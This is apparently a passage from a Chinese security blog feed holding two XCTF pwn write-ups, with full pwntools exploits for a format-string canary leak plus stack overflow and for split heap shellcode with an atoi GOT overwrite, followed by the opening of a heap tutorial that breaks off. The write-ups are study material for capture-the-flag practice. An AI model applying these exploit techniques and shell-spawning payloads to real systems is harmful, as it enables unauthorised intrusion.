    
    
  </entry>
  
  <entry>
    <title>【XCTF-Pwn:Mary_Morto】非常简单的热身pwn（ps：我还真信了）</title>
    <link href="https://muzibing.github.io/2020/07/19/2020.07.19%EF%BC%88138%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/19/2020.07.19（138）/</id>
    <published>2020-07-18T16:00:00.000Z</published>
    <updated>2020-07-25T03:07:52.975Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x00-相关知识点font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-相关知识点font"></a> <font color="navy"><code>0x00 相关知识点</code></font></h3><blockquote><ul><li>格式化字符串的利用</li><li>金丝雀的绕过</li><li>栈的溢出</li></ul></blockquote><h3 id="font-color-navy0x01-分析题目font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-分析题目font"></a> <font color="navy"><code>0x01 分析题目</code></font></h3><blockquote><p>既然题目说是个非常简单的热身的pwn，那我就简单的<b>热一下身</b></p></blockquote><h4 id="font-color-blue1file-maryfont"><a class="markdownIt-Anchor" href="#font-color-blue1file-maryfont"></a> <font color="blue"><code>1.file mary</code></font></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file mary</span><br><span class="line">mary: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b7971b84c2309bdb896e6e39073303fc13668a38, stripped</span><br></pre></td></tr></table></figure><blockquote><p>该文件是一个64位的ELF可执行文件</p></blockquote><h4 id="font-color-blue2checksec-maryfont"><a class="markdownIt-Anchor" href="#font-color-blue2checksec-maryfont"></a> <font color="blue"><code>2.checksec mary</code></font></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># checksec mary</span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/2/Mary_Morton/mary&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><blockquote><p>可以看出开启了金丝雀保护和栈不可执行保护，因此我们可能需要对金丝雀进行绕过</p></blockquote><h4 id="font-color-blue3试运行程序font"><a class="markdownIt-Anchor" href="#font-color-blue3试运行程序font"></a> <font color="blue"><code>3.试运行程序</code></font></h4><p><img src="/images/138-1.png" alt></p><blockquote><p>从上图可以得知，该程序有两个选项：栈溢出和格式化字符串漏洞，那说明选项1可能有栈溢出的风险，选项2可能有格式化字符串漏洞的风险，这是我们试运行程序得到的信息，下面我就看看该程序的伪代码。</p></blockquote><h4 id="font-color-blue4获取程序的伪代码font"><a class="markdownIt-Anchor" href="#font-color-blue4获取程序的伪代码font"></a> <font color="blue"><code>4.获取程序的伪代码</code></font></h4><p><img src="/images/138-2.png" alt></p><blockquote><p>上图是程序选项为<code>1</code>时的伪代码，可以看出该模块是有栈溢出漏洞的危害</p></blockquote><p><img src="/images/138-3.png" alt></p><blockquote><p>上图是程序选项为<code>2</code>时的伪代码，可以看出该模块有格式化字符串漏洞</p></blockquote><h3 id="font-colornavy0x02-解题思路font"><a class="markdownIt-Anchor" href="#font-colornavy0x02-解题思路font"></a> <font color="navy"><code>0x02 解题思路</code></font></h3><p>      从上文对题目的分析以后，我们可以有一种利用思路是：</p><blockquote><ol><li>通过格式化字符串漏洞将Canary泄露出来</li><li>再通过选项1的栈溢出执行shellcode</li></ol></blockquote><p>      下面我们看看怎么写exp脚本：</p><h4 id="font-color-blue1泄露canaryfont"><a class="markdownIt-Anchor" href="#font-color-blue1泄露canaryfont"></a> <font color="blue"><code>1.泄露canary</code></font></h4><p>      通过上图可以看出，我们输入的<code>AAAAAAAA</code>，距离格式化字符串有6个位置，但是去掉前5个寄存器的位置，那么就是格式化字符串和<code>buf</code>的位置相邻，那么下面我们确定一下金丝雀的位置：</p><p><img src="/images/138-4.png" alt></p><blockquote><p>可以从上图看出，金丝雀的位置为<code>rbp-0x8</code>，因为<code>buf</code>的距离<code>rbp</code>的位置有<code>0x90</code>，所以我们可以得出<code>buf</code>距离 Canary有<code>0x88</code>，也就是<code>0x88/8=17</code>个地址单位，那么距离格式化字符串有<code>17（buf到canary的距离）+5（5个寄存器）+1（canary本身）=23</code>个单位，如下图所示：</p></blockquote><p><img src="/images/138-5.jpg" alt></p><blockquote><p>那么我们可以将格式化字符串设置为<code>%23$p</code>，下图是运行程序时输入的<code>%23$p</code>，输出结果为<code>0x2c3bceda73691600</code>，从后两位可得这是canary，那么我们就成功的把金丝雀泄露出来了。</p></blockquote><p><img src="/images/138-6.png" alt></p><h4 id="font-color-blue2栈溢出font"><a class="markdownIt-Anchor" href="#font-color-blue2栈溢出font"></a> <font color="blue"><code>2.栈溢出</code></font></h4><p><img src="/images/138-2.png" alt></p><blockquote><p>上图中的buf可以输入的空间大小有<code>0x100</code>，而buf到ebp的距离却只有<code>0x90</code>，所以说这里存在着栈溢出的漏洞，但是有因为有canary，所以利用方式如下图：</p></blockquote><p><img src="/images/138-7.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># ROPgadget --binary mary --string &quot;system&quot;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000400464 : system</span><br><span class="line"></span><br><span class="line"># ROPgadget --binary mary --string &quot;flag&quot;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000400b36 : flag</span><br></pre></td></tr></table></figure><blockquote><p>从上面的搜索结果中可以看出，该程序中里面包含“system”和“flag”的，下面我们就在IDA中搜索一下位置，看一下是否有可以直接利用的shellcode，若然还真有，如下图：</p></blockquote><p><img src="/images/138-8.png" alt></p><blockquote><p>地址为<code>0x4008DA</code>，下面我们就可以构造exp了</p></blockquote><h3 id="font-color-navy0x03-expfont"><a class="markdownIt-Anchor" href="#font-color-navy0x03-expfont"></a> <font color="navy"><code>0x03 exp</code></font></h3><p><code>选项2泄露canary，选项1进行栈溢出</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python3</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#! coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"220.249.52.133"</span>,<span class="number">36580</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x4008DA</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">()</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"3. Exit the battle"</span>,<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_string</span><span class="params">()</span>:</span></span><br><span class="line">payload1 = <span class="string">"%23$p"</span></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">canary = int(r.recvuntil(<span class="string">"\n"</span>)[:<span class="number">16</span>],<span class="number">16</span>)</span><br><span class="line">print(<span class="string">"[*] The value of Canary is"</span>,canary)</span><br><span class="line"><span class="keyword">return</span> canary</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">overflow</span><span class="params">(canary)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"3. Exit the battle"</span>,<span class="string">"1"</span>)</span><br><span class="line">payload2 = (<span class="number">0x90</span><span class="number">-0x8</span>)*<span class="string">"a"</span> + str(p64(canary),encoding=<span class="string">"unicode_escape"</span>) + <span class="string">"a"</span>*<span class="number">8</span> + str(p64(system_addr),encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">start()</span><br><span class="line">canary = format_string()</span><br><span class="line">overflow(canary)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x00-相关知识点font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-相关知识点font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="XCTF" scheme="https://muzibing.github.io/tags/XCTF/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="栈相关题目" scheme="https://muzibing.github.io/tags/%E6%A0%88%E7%9B%B8%E5%85%B3%E9%A2%98%E7%9B%AE/"/>
    
  </entry>
  
  <entry>
    <title>【XCTF-Pwn:Note-service2】在堆上执行shellcode</title>
    <link href="https://muzibing.github.io/2020/07/18/2020.07.18%EF%BC%88137%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/18/2020.07.18（137）/</id>
    <published>2020-07-17T16:00:00.000Z</published>
    <updated>2020-07-19T02:55:37.613Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x00-基础知识font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-基础知识font"></a> <font color="navy"><code>0x00 基础知识</code></font></h3><h4 id="font-color-blue1什么是shellcodefont"><a class="markdownIt-Anchor" href="#font-color-blue1什么是shellcodefont"></a> <font color="blue"><code>1.什么是shellcode</code></font></h4><blockquote><p>shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode<strong>机器码</strong>，让电脑可以执行攻击者的任意指令。 ——维基百科</p></blockquote><h4 id="font-color-blue2shellcode的c语言形式font"><a class="markdownIt-Anchor" href="#font-color-blue2shellcode的c语言形式font"></a> <font color="blue"><code>2.shellcode的C语言形式</code></font></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *code[<span class="number">2</span>]; </span><br><span class="line">    code[<span class="number">0</span>] = <span class="string">"/bin/sh"</span>; </span><br><span class="line">    code[<span class="number">1</span>] = <span class="literal">NULL</span>; </span><br><span class="line">    execve(code[<span class="number">0</span>], code, <span class="literal">NULL</span>); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>再将上述代码进行简化：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    execve(<span class="string">"/bin/sh"</span>,<span class="number">0</span>, <span class="number">0</span>); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="font-color-blue3shellcode的汇编形式font"><a class="markdownIt-Anchor" href="#font-color-blue3shellcode的汇编形式font"></a> <font color="blue"><code>3.shellcode的汇编形式</code></font></h4><blockquote><p>将上述代码进行编译，然后在反汇编，就可以看到其汇编代码，如下：（只关注main函数的）</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0000000000001135 &lt;main&gt;:</span><br><span class="line">    1135:       55                      push   %rbp</span><br><span class="line">    1136:       48 89 e5                mov    %rsp,%rbp</span><br><span class="line">    1139:       48 83 ec 10             sub    $0x10,%rsp</span><br><span class="line">    113d:       89 7d fc                mov    %edi,-0x4(%rbp)</span><br><span class="line">    1140:       48 89 75 f0             mov    %rsi,-0x10(%rbp)</span><br><span class="line">    1144:       ba 00 00 00 00          mov    $0x0,%edx</span><br><span class="line">    1149:       be 00 00 00 00          mov    $0x0,%esi</span><br><span class="line">    114e:       48 8d 3d af 0e 00 00    lea    0xeaf(%rip),%rdi        # 2004 &lt;_IO_stdin_used+0x4&gt;</span><br><span class="line">    1155:       e8 d6 fe ff ff          callq  1030 &lt;execve@plt&gt;</span><br><span class="line">    115a:       b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">    115f:       c9                      leaveq </span><br><span class="line">    1160:       c3                      retq   </span><br><span class="line">    1161:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)</span><br><span class="line">    1168:       00 00 00 </span><br><span class="line">    116b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)</span><br></pre></td></tr></table></figure><blockquote><p>rax 保存系统调用号#59，这是execve的调用号<br>rdi  保存execve的第一个参数，是&quot;/bin/sh&quot;的地址<br>rsi  是指向前面用到的&quot;/bin/sh&quot;的指针开始并以空指针结尾的指针数组<br>rdx 是零，用来做execve的第三个参数<br>execve的原型是：<code>int execve(const char *filename, char *const argv[],char *const envp[]);</code></p></blockquote><p>      在很多题目中对输入的长度有限制，上述的shellcode就显得不起作用了，所以还需要精简shellcode，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rax,0x3b</span><br><span class="line">mov rsi,0</span><br><span class="line">mov rdx,0</span><br><span class="line">mov rdi,XXX  # rdi代表的是“/bin/sh”的地址</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><blockquote><p>这是针对64位的，但是这种字节码就要比32位下的长很多，因为0x3b只需要占8个bit，所以将rax改为eax也可以，并且还减少了字节的长度，其他命令也是如此，rdi有点特殊，大家可以想一下。</p></blockquote><h4 id="font-color-blue4jmp-命令font"><a class="markdownIt-Anchor" href="#font-color-blue4jmp-命令font"></a> <font color="blue"><code>4.jmp *** 命令</code></font></h4><blockquote></blockquote><h3 id="font-color-navy0x01-解题思路font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-解题思路font"></a> <font color="navy"><code>0x01 解题思路</code></font></h3><h4 id="font-color-blue1file-pwnfont"><a class="markdownIt-Anchor" href="#font-color-blue1file-pwnfont"></a> <font color="blue"><code>1.file pwn</code></font></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># file pwn</span><br><span class="line"></span><br><span class="line">pwn: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6c3a706907441fd73514dbca2d692e7a7c9139aa, stripped</span><br></pre></td></tr></table></figure><blockquote><p>可以得到该文件是一个64位的ELF文件</p></blockquote><h4 id="font-color-blue2checksec-pwnfont"><a class="markdownIt-Anchor" href="#font-color-blue2checksec-pwnfont"></a> <font color="blue"><code>2.checksec pwn</code></font></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># checksec pwn</span><br><span class="line"></span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/2/note-service2/pwn&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><blockquote><p>可以看出NX没有开启保护，并且<code>Has RWX segments</code>说明栈和堆上的代码可执行，也就是说我们可以将我们的shellcode放入栈中，然后进行执行，除此之外开启了地址无关代码，以及金丝雀保护。下面看看伪代码：</p></blockquote><p><code>addNote函数</code></p><p><img src="/images/137-1.png" alt></p><blockquote><p>从上图中可以看出，<font color="green">程序并没有对<code>qword_2020A0[v1]</code>数组的下标进行检查，</font>从而可能导致在任意地址上进行读写操作，甚至可能改变got表中的值。从上图还可以看出，我们只能申请8字节大小的堆空间，那么我们能输入的content有多大呢？下面我们就看一下<code>sub_B69((__int64)qword_2020A0[v1], v2);</code>函数，如下图：</p></blockquote><p><img src="/images/137-2.png" alt></p><blockquote><p>从上图中可以看出，我们能往chunk中输入的字符最多有7个字节，所以说我们上文所说的shellcode就无法全部输入进去，那么我们是否可以将这些shellcode分别输入到不同的chunk，然后用jmp命令将这些shellcode连接起来呢？首先我们来确定shellcode的划分：</p><ul><li>mov eax,0x3B：5字节</li><li>mov esi,0：5字节</li><li>mov edx,0：5字节</li><li>syscall：2字节</li></ul></blockquote><p>      “/bin/sh”的值可以通过程序的输入进行输入，在这里我们用<code>atoi()函数</code>，我们看一下第一次执行<code>atoi函数</code>的汇编：</p><p><img src="/images/137-3.png" alt></p><blockquote><p>通过上图可以看出，如果输入的是&quot;/bin/sh&quot;，汇编代码会自动将其地址放入rdi中，所以无需我们自己再构造指令了。</p></blockquote><h4 id="font-color-blue3确定jmp的距离font"><a class="markdownIt-Anchor" href="#font-color-blue3确定jmp的距离font"></a> <font color="blue"><code>3.确定jmp的距离</code></font></h4><p>      上面已经得到要输入的shellcode了，但是每个chunk中的shellcode怎么连接起来呢？这就需要我们的<code>jmp short</code>指令，这是一个相对近址跳转指令，我们来看看它的原理是什么，如下图：</p><p><img src="/images/137-4.png" alt></p><blockquote><p>如上图，看地址为<code>0xE94</code>和<code>0xEA0</code>处的汇编指令，都是<code>jmp short loc_ED1</code>，那么jmp是怎么跳转到的呢？下面看上图中的右半部分，可以看出地址为<code>0xE94</code>的指令的字节为：<code>EB 3B</code>，而地址<code>0xEA0</code>的指令的字节为：<code>EB 2F</code>，它们都是跳转到地址为<code>ED1</code>处，来计算一下是怎么跳转的：</p><ul><li><code>0xE94</code>：0xe94+0x3b = 0xecf，0xecf+2 = 0xed1</li><li><code>0xEA0</code>：0xea0+0x2f = 0xecf，0xecf+2 = 0xed1</li></ul><p>也就是说要得到目标地址那么就是jmp指令距离函数loc_ED1的距离2F，那么在堆中的跳转距离是多少呢？下面画一个示意图来说明一下，如下图：</p></blockquote><p><img src="/images/137-5.png" alt></p><blockquote><p>由此看来jmp short xxx中的xxx的值是<code>该命令行结束后的地址，即图中的0x1017地址，到要执行命令的起始位置，即图中的0x1030位置</code>，所以我们可以得到jmp结束后的地址到下一个chunk用户数据处的地址的距离为：<code>1+8+8+8 = 25(0x19)</code>，为什么是这样的，可以看上图的实例。</p></blockquote><h4 id="font-color-blue4确定解题思路font"><a class="markdownIt-Anchor" href="#font-color-blue4确定解题思路font"></a> <font color="blue"><code>4.确定解题思路</code></font></h4><blockquote><p>通过上述的分析，我们确定了如下的解题思路：</p><ol><li>将我们的shellcode布置在几个不同的堆块上，如下图：</li></ol><p><img src="/images/137-6.jpg" alt></p><ol start="2"><li>根据上图是可以看到，我们可以通过数组下标溢出，将atoi的got表的值改为我们申请的第一个块的地址，但是如果一开始就修改atoi的got表，那么在后面的程序运行中会出现错误，所以我们在最后修改atoi的got表地址，而且必须放在chunk的最前面，因为这样才能形成一个完整的控制流，那么我们如何操作呢？我们可以利用uaf的技巧，这是因为该程序在释放空间时没有将指针置为NULL，当我们释放了第一个chunk，然后再申请一个相同大小的chunk，进行重复利用，从而修改atoi的got表地址；其他的chunk即按照正常的顺序申请即可，申请流程如下：</li></ol><p><img src="/images/137-7.jpg" alt></p><ol start="3"><li>从上图可以看出，我们就可以写出完整的exp</li></ol></blockquote><h3 id="font-color-navy0x02-完整expfont"><a class="markdownIt-Anchor" href="#font-color-navy0x02-完整expfont"></a> <font color="navy"><code>0x02 完整exp</code></font></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"220.249.52.133"</span>,<span class="number">40709</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">elf = ELF(<span class="string">"pwn"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addNote</span><span class="params">(r, index, size, content)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"your choice&gt;&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"index:"</span>,index)</span><br><span class="line">r.sendlineafter(<span class="string">"size:"</span>,size)</span><br><span class="line">r.sendafter(<span class="string">"content"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deleteNote</span><span class="params">(r, index)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"your choice&gt;&gt; "</span>,<span class="string">"4"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"index"</span>,index)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addNote(r,<span class="string">"0"</span>,<span class="string">"8"</span>,<span class="string">"a"</span>*<span class="number">7</span>)</span><br><span class="line">addNote(r,<span class="string">"1"</span>,<span class="string">"8"</span>,asm(<span class="string">'xor rsi,rsi'</span>,os=<span class="string">"linux"</span>,arch=<span class="string">"amd64"</span>) + <span class="string">b'\x90\x90\xeb\x19'</span>)</span><br><span class="line">addNote(r,<span class="string">"2"</span>,<span class="string">"8"</span>,asm(<span class="string">'xor rdx,rdx'</span>,os=<span class="string">"linux"</span>,arch=<span class="string">"amd64"</span>) + <span class="string">b'\x90\x90\xeb\x19'</span>)</span><br><span class="line">addNote(r,<span class="string">"3"</span>,<span class="string">"8"</span>,str(asm(<span class="string">'syscall'</span>,os=<span class="string">"linux"</span>,arch=<span class="string">"amd64"</span>),encoding=<span class="string">"unicode_escape"</span>).ljust(<span class="number">7</span>,<span class="string">'\x90'</span>))</span><br><span class="line">addNote(r,<span class="string">"4"</span>,<span class="string">"8"</span>,<span class="string">"/bin/sh"</span>)</span><br><span class="line">deleteNote(r,<span class="string">"0"</span>)</span><br><span class="line"><span class="comment">#addNote(r,str((elf.got["free"]-0x2020A0)//8),"8",asm('xor rax,rax',os="linux",arch="amd64") + b'\x90\x90\xeb\x19')</span></span><br><span class="line"><span class="comment">#addNote(r,"2","8",asm('mov eax,0x3B',os="linux",arch="amd64") + b'\xeb\x19')</span></span><br><span class="line">addNote(r,str((elf.got[<span class="string">"atoi"</span>]<span class="number">-0x2020A0</span>)//<span class="number">8</span>),<span class="string">"8"</span>,asm(<span class="string">'mov eax,0x3B'</span>,os=<span class="string">"linux"</span>,arch=<span class="string">"amd64"</span>) + <span class="string">b'\xeb\x19'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'your choice&gt;&gt;'</span>,<span class="string">'/bin/sh'</span>)  </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x00-基础知识font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-基础知识font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00 基
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="XCTF" scheme="https://muzibing.github.io/tags/XCTF/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="堆相关题目" scheme="https://muzibing.github.io/tags/%E5%A0%86%E7%9B%B8%E5%85%B3%E9%A2%98%E7%9B%AE/"/>
    
  </entry>
  
  <entry>
    <title>由浅入深的剖析堆</title>
    <link href="https://muzibing.github.io/2020/07/13/2020.07.13%EF%BC%88136%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/13/2020.07.13（136）/</id>
    <published>2020-07-12T16:00:00.000Z</published>
    <updated>2020-07-14T15:00:52.603Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ptr;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>     只要学过C语言的同学想必都申请过堆内存吧，那么大家是否真正了解申请堆和释放堆后面的机制吗？今天我就带领大家一步一步的来了解，先在这里留一个问题：<code>上述代码是否有漏洞？</code>以后会慢慢的揭开这个答案，本文均是在64位下进行的实验。</p><h3 id="font-color-navy0x00-什么是堆font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-什么是堆font"></a> <font color="navy"><code>0x00 什么是堆？</code></font></h3><blockquote><p>在计算机科学中, 动态内存分配（Dynamic memory allocation）又称为堆内存分配，是指计算机程序在运行期中分配使用内存。它可以当成是一种分配有限内存资源所有权的方法。动态分配的内存在被程序员明确释放或被垃圾回收之前一直有效。与静态内存分配的区别在于没有一个固定的生存期。这样被分配的对象称之为有一个“动态生存期”。对堆操作的<strong>是由堆管理器（ptmalloc2）来实现的，而不是操作系统内核</strong>。因为程序每次申请或者释放堆时都需要进行系统调用，系统调用的开销巨大，当频繁进行堆操作时，就会严重影响程序的性能</p></blockquote><p>      简而言之，堆就是程序员动态分配的一个内存空间，它在进程内存中的分布如下：</p><p><img src="/images/136-1.png" alt></p><center><font size="2">图1</font></center><p>      